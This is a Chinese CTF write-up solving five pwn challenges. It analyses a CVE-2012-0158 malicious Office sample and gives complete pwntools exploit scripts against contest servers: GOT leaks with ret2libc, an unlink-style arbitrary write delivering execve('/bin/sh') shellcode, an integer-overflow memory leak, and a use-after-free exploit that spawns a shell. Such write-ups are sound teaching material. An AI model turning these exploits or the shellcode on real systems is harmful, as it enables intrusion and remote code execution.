# PWN100

下载下来 Symantec 报毒，刚开始不知什么原因一直分析不了，后来突然想到算了一下样本的 md5，发现和题目给的不一样，才知道是被 Symantec 给日了一半。

丢到 VirusTotal 上报是 CVE-2012-0158，看了非常多的分析资料。

首先用 OfficeMalScanner （ 或者自己手动抠然后 decode('hex') ）拿到 shellcode 段。分析了半天无果，甚是生气。直接将 shellcode 覆盖到随意一个程序中并让 eip 跳进去也会报错退出。注意到 `\x90\x90\x90\x90` 前的 `jmp esp` 的地址 `0x27583c30` 很奇怪，用 Google 搜了一下发现了端倪 [MS12-027 MSCOMCTL ActiveX Buffer Overflow](http://www.i0day.com/128.html)

原来这是一个 Metasploit 生成的脚本，那么就是用了 Metasploit payload 的 encoder。试图分析这个 encoder 但难度过大，吃完夜宵回来灵机一动（其实是之前太蠢），采用了执行 shellcode 的正确姿势，写了这样一个程序。

```cpp
#include <stdio.h>

int main() {
	char shellcode[] = "此处省略 1W 个字符;

	printf("Hello\n");
	(*(void(*)())shellcode)();
}
```

断点调试后发现程序执行了 `echo xdctf{此处省略若干字符} > C:\xxx\xxx`

# PWN200

主题：出题人真变态

程序忘了啥漏洞，应该是很简单的，反正效果应该是一个 leak + Arbitrary Write，总之就是先获取某 got 表中函数真实地址，再通过 libc 计算偏移，最后执行 `system('/bin/sh')`

然而变态的出题人强行搞了个独一无二的 libc （害我还先去 pwn300 上把 libc 给拖下来了），也就是说不知如何计算 `system()` 和 `/bin/sh` 的偏移。

不过程序中有 leak，而且 leak 是自己规定打印的字符数量的，于是就猜猜猜。先确定大致 libc 段的地址（根据 got 表中的函数地址），然后根据 `\x7FELF` 找到 libc 段的开头，再把它全部打印回来保存起来。比较坑的是加载在内存中的 libc 段并不能完整地保存成一个 ELF 文件，因此无法用 pwntools 的 `ELF()` 进行分析，于是再次猜猜猜，根据汇编代码猜到了两处疑似 `system()` 函数的位置（`/bin/sh` 就不用猜了，直接就能定位到），然后试了下就成功了。

```python
__author__ = "cMc_SARS"

from pwn import *

# p = process('pwn200')
p = remote('133.130.111.139', 2333)
context(terminal='tmux')

libc = ELF('libc.xd')
#libc = ELF('remote_libc')
libc_read = libc.symbols['read']
libc_system = libc.symbols['system']
libc_open = libc.symbols['open']
libc_execve = libc.symbols['execve']
libc_write = libc.symbols['write']
libc_sh = libc.search('/bin/sh').next()

read_got = 0x0804a004
write_got = 0x0804a010
main_got = 0x0804a00c

p.recv()

payload = "A"*0x6c
payload += "BBBB"
payload += p32(0x0804855A)
payload += p32(1)
payload += p32(write_got)
payload += p32(4)
payload += "AAAA" * 8
p.write(payload)
write_addr = u32(p.recv(4))
# print hex(write_addr)

payload = "A"*0x6c
payload += "BBBB"
payload += p32(0x0804855A)
payload += p32(1)
payload += p32(main_got)
payload += p32(4)
payload += "AAAA" * 8
p.write(payload)
main_addr = u32(p.recv(4))
# print hex(main_addr)

open_addr = write_addr - libc_write + libc_open
execve_addr = write_addr - libc_write + libc_execve
# print hex(execve_addr)
system_addr = libc_system - libc_write + write_addr
sh_addr = libc_sh - libc_write + write_addr
# print hex(system_addr)
print hex(sh_addr-8843)
sh_addr = sh_addr-8843

payload = "A"*0x6c
payload += "BBBB"
payload += p32(0x0804855A)
payload += p32(1)
payload += p32(sh_addr)
# payload += p32((main_addr&0xfffff000)-0x1000*25)
# payload += p32(0x1ac700+0x3860)
payload += p32(20)
payload += "AAAA" * 8
p.write(payload)
"""
with open("find_system", "wb") as fp:
    fp.write(p.recvall(timeout=100))
"""
payload = "A"*0x6c
payload += "BBBB"
system_addr = sh_addr-0x11ee49
payload += p32(system_addr)
payload += p32(0xdeadbeef)
payload += p32(sh_addr)
p.write(payload)

p.interactive()
```

# PWN300

pwn300 是一血哦， pwn300 是一血哦， pwn300 是一血哦。重要的事情说三遍。

很简单一题，就是人工实现链表的时候忘了哪里出问题了。总之是一个类似 `unlink()` 的操作出现了 Arbitrary Write。和以前做过 pwnable 上的一题非常像。

```python
__author__ = "cMc_SARS"

from pwn import *

# p = process('pwn300')
p = remote('133.130.90.210', 6666)
context(terminal='tmux')

sbrk_got = 0x0804b028

for i in range(4):
    p.writeline('1')
    p.writeline('0')

p.writeline('3')
p.writeline('1')
p.writeline('2')
p.recvuntil('Give your Girl:')

payload_1 = util.cyclic.cyclic(length=7*4*4)
payload_1 += p32(0x81)
payload_1 += p32(sbrk_got-8)
p.write(payload_1)

p.writeline('2')
p.writeline('2')

p.writeline('3')
p.writeline('1')
p.writeline('2')
print p.recv()
raw_input()

payload = 'A'*6*4*4+16*'B'+p32(0)+p32(0)
payload += util.cyclic.cyclic(length=8*4*4-4)
payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
p.write(payload)

p.interactive()
```

# PWN400

这道题简直莫名其妙，是一个逻辑漏洞， X 型溢出。因为要求的输入格式比较蛋疼，所以我偷懒一直在逆向，而没有动手调试，没想到。。。

其实就是某个控制打印长度的变量，在检查这个值的时候是用 (len + 2) 去判断是否小于另外某个值的，而 len 这个值是一个 _WORD 类型，也就是说如果我输入 `\xff\xff` 加 2 后就会变得非常小，就能通过判断了，而打印的时候确是 `\xff\xff` 个字符，所以就会顺便把内存某个阴暗角落中的 flag 给打印出来了

```python
__author__ = "cMc_SARS"

from pwn import *

p = remote('159.203.87.2', 8888)
zip_data = "PK\x01\x02"
payload = zip_data + "AAAAAAAAAAAAAAAAAAAAAAAA"
payload += "\xff\xffAA"
payload += "AAAAAAAAAAAA"
payload += "AAAAAAAAAAAA"

payload = payload.ljust(0x90, 'A')

p.write(payload)
p.interactive()
```

# PWN500

这题还不错，但是还是有坑。

最开始发现了一个栈溢出，能控制 ebp，但是控制不了 eip，或者说只能让 eip 到一个不能利用的地方。在这一点上我想了非常久，最终没有结果，甚是生气*2

先画一下结构


```
+--------------+  <-- 0x00
|     name     |
+--------------+  <-- 0x10
| descriptions |
+--------------+  <-- 0xE0
|     math     |
+--------------+  <-- 0xE8
|    English   |
+--------------+  <-- 0xF0
|     dota     |
+--------------+  <-- 0xF8
```

```
+--------------+  <-- 0x00
|    number    |
+--------------+  <-- 0x04
|   real_len   |
+--------------+  <-- 0x08
|   essaylen   |
+--------------+  <-- 0x0C
|    unknow    |
+--------------+  <-- 0x10
|  essay_addr  |
+--------------+  <-- 0x18
|     Func     |
+--------------+
```

差不多就上面那样。后来发现了一个 UAF 漏洞，逻辑问题出在 resit 的时候是根据 essay_len 来判断，如果 essay_len 不为空则会清空 essay_len 和 essay_addr；如果已经为空那就只是 free 掉，而不会清空 essay_addr。所以我们构造一个原本长度就为 0 的 essay，这样在 resit 的时候不会清空掉 essay_addr，这时候再用 cheat 分配一个超大的堆，就可以覆盖掉这里的 essay_addr 原本指向的地方，然后 call Func 的时候就是 call 我们构造好的函数了。

题目给了 libc，执行 `export LD_PRELOAD="./libc-2.19.so"` 可以帮助更好地分析。

```python
__author__ = "cMc_SARS"

from pwn import *

# p = process('jwc')
p = remote('128.199.232.78', 5432)
context(terminal='tmux')

libc = ELF('libc-2.19.so')
libc_write = libc.symbols['write']
libc_system = libc.symbols['system']

p.writeline('1')
p.writeline(16*'A')
p.writeline(200*'1')

# KENG!
p.writeline('2')
p.writeline('1')
p.writeline('103')
payload = '\x00' + 'A'*0x5f
payload += p64(0x6023B0)
p.write(payload)

# resit
p.writeline('5')
p.writeline('1')

# English
p.writeline('2')
p.writeline('2')
p.writeline('1')
p.writeline('1')
p.recv()

# cheat
p.writeline('1024')
p.writeline('1')
payload = "%d%d;%lx;\x00\x00\x00"
payload += "A"*4*3
payload += p64(0x4009B0)
payload = payload.ljust(103, 'A')
# p.writeline(util.cyclic.cyclic(length=103))
p.writeline(payload)

# show score
p.writeline('3')
p.recvuntil(';')
write_addr = int(p.recvuntil(';')[:-1], 16) - 0x10
print hex(write_addr)
system_addr = write_addr + libc_system - libc_write
print hex(system_addr)

# cheat
p.writeline('1024')
p.writeline('1')
payload = "/bin/sh\x00"
payload += "A"*4*4
payload += p64(system_addr)
payload = payload.ljust(103, 'A')
# p.writeline(util.cyclic.cyclic(length=103))
p.writeline(payload)
p.writeline('3')

p.interactive()
```